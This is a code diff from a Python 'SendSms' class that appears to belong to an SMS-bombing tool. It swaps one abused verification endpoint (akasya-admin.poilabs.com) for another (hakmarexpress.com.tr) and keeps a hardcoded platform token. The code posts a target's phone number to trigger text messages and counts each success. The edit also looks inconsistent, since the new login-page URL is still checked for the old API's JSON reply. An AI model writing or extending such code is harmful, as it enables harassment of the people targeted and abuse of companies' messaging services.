@@ -446,19 +446,19 @@ class SendSms():
             
         
     #ak-asya.com.tr
-    def Akasya(self):
+    def Hakmar(self):
         try:
-            url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
+            url = "https://www.hakmarexpress.com.tr/giris-yap"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Hakmar", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
             json={"phone": self.phone}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == "SMS sended succesfully!":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> https://www.hakmarexpress.com.tr/giris-yap")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> https://www.hakmarexpress.com.tr/giris-yap")
         
         
     #akbati.com
